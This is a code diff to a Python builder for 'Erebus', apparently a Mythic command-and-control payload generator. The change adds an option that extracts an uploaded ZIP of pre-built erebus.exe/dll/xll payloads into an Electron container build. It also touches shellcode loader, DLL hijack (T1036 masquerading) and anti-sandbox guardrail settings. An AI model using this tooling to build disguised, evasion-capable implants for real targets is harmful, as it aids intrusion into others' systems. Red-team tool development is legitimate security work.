@@ -81,6 +81,7 @@ import tempfile
 import shutil
 import hashlib
 import asyncio
+import io
 import subprocess
 import zipfile
 import secrets
@@ -1366,28 +1367,26 @@ generated if none have been entered.""",
                 "square and at least 256x256; it is converted to a multi-size "
                 "ICO at build time."
             ),
+            required = False,
             hide_conditions = [
                 HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
             ]
         ),
         BuildParameter(
-            name = "3.E6 Electron Build Mode",
-            parameter_type = BuildParameterType.ChooseOne,
+            name = "3.E6b Electron Payload Zip",
+            parameter_type = BuildParameterType.File,
             description = (
-                "In-Container (Wine): npm + electron-builder run inside the Docker container.\n"
-                "Deferred (Erebus.Helper): stage source + build_electron.bat for a Windows host."
+                "Optional ZIP containing a pre-built payload and/or DLL to use instead of\n"
+                "the Mythic-compiled loader. The archive must contain erebus.exe, erebus.dll,\n"
+                "and/or erebus.xll at its root. Files are extracted directly into payload/\n"
+                "before containerisation, replacing any compiled output."
             ),
-            choices = ["In-Container (Wine)", "Deferred (Erebus.Helper)"],
-            default_value = "In-Container (Wine)",
+            required = False,
             hide_conditions = [
                 HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
             ]
         ),
 
-        # Electron guardrails (anti-sandbox / anti-analysis). All are gated
-        # behind the master switch 3.E9 and only take effect when the
-        # container type is Electron. The loader tree is NOT copied to the
-        # temp directory until every enabled guardrail passes.
         BuildParameter(
             name = "3.E9 Enable Electron Guardrails",
             parameter_type = BuildParameterType.Boolean,
@@ -2239,6 +2238,30 @@ generated if none have been entered.""",
                 )
 
             case "Electron":
+                # Optional pre-built payload zip: extract erebus.{exe,dll,xll}
+                # into payload/ before containerisation, replacing compiled output.
+                payload_zip_uuid = self.get_parameter("3.E6b Electron Payload Zip")
+                if payload_zip_uuid:
+                    zip_resp = await SendMythicRPCFileGetContent(
+                        MythicRPCFileGetContentMessage(AgentFileId=payload_zip_uuid)
+                    )
+                    if not zip_resp.Success or not zip_resp.Content:
+                        raise RuntimeError("Failed to retrieve 3.E6b Electron Payload Zip from Mythic.")
+                    _payload_dir = Path(agent_build_path) / "payload"
+                    _payload_dir.mkdir(parents=True, exist_ok=True)
+                    allowed = {"erebus.exe", "erebus.dll", "erebus.xll"}
+                    with zipfile.ZipFile(io.BytesIO(zip_resp.Content)) as zf:
+                        extracted = []
+                        for member in zf.namelist():
+                            basename = Path(member).name
+                            if basename in allowed:
+                                (_payload_dir / basename).write_bytes(zf.read(member))
+                                extracted.append(basename)
+                    if not extracted:
+                        raise RuntimeError(
+                            "3.E6b Electron Payload Zip contained no erebus.{exe,dll,xll}."
+                        )
+
                 # Optional operator-supplied icon (PNG). Fetched from Mythic
                 # by file UUID when set; falls back to the vendored Erebus.png.
                 custom_icon_bytes = None
@@ -2287,7 +2310,6 @@ generated if none have been entered.""",
                     entry_format=self.get_parameter("3.E4 Electron Entry Format"),
                     entry_name=f"erebus.{self.get_parameter('3.E4 Electron Entry Format')}",
                     dll_entry=self.get_parameter("3.E5 Electron DLL Entry Point") or "DllMain",
-                    build_mode=self.get_parameter("3.E6 Electron Build Mode"),
                     file_description=self.get_parameter("3.E7 Electron File Description") or "Setup",
                     copyright_str=self.get_parameter("3.E8 Electron Copyright") or "",
                     custom_icon_bytes=custom_icon_bytes,
@@ -2324,26 +2346,6 @@ generated if none have been entered.""",
 
             agent_build_path = tempfile.TemporaryDirectory(suffix = self.uuid).name
             agent_code_path = Path(__file__).resolve().parent.parent / "agent_code"
-            # Exclude stale build artifacts when seeding the temp build tree.
-            #
-            # The Erebus.Loader Makefile uses pattern rules without explicit
-            # header-dependency tracking, so if a previous build left .o
-            # files (or a final erebus.{exe,dll,cpl,xll}) inside the source
-            # `agent_code/Erebus.Loaders/Erebus.Loader/` tree, copytree
-            # preserves their mtimes into the fresh tmp dir. When builder.py
-            # then overwrites `include/shellcode.hpp` with the freshly
-            # obfuscated apollo bytes, make compares mtimes against the
-            # stale .o files (which still know nothing about shellcode.hpp
-            # because it isn't in the per-source dep list) and concludes
-            # "Nothing to be done for 'all'". The link uses the stale
-            # main.o that was compiled against the `{ 0x00 }` stub
-            # shellcode, and the resulting binary fails at runtime with
-            # "[!] Shellcode is NULL or size is 0 after staging".
-            #
-            # Excluding artifacts here is the surgical fix: the copytree
-            # produces a clean source tree every build, make has no stale
-            # .o/binaries to consider up-to-date, and the recompile is
-            # forced to pick up the freshly written shellcode.hpp.
             shutil.copytree(
                 str(agent_code_path),
                 agent_build_path,
@@ -2910,7 +2912,9 @@ generated if none have been entered.""",
                     config_hpp_destination = str(PurePath(shellcode_loader_path) / "include" / "config.hpp")
                     with open(config_hpp_destination, "w") as config_file:
                         config_file.write(rendered_config)
-                    await self._build_step("[T1036] - Configuring DLL Hijack Loader", "Generated config.hpp with encryption/compression settings", success=True)
+                    await self._build_step("[T1036] - Configuring DLL Hijack Loader", 
+                                           "Generated config.hpp with encryption/compression settings", 
+                                           success=True)
                 except Exception as e:
                     await self._fail_step(response, "[T1036] - Configuring DLL Hijack Loader",
                         f"Failed to render Hijack config: {str(e)}",
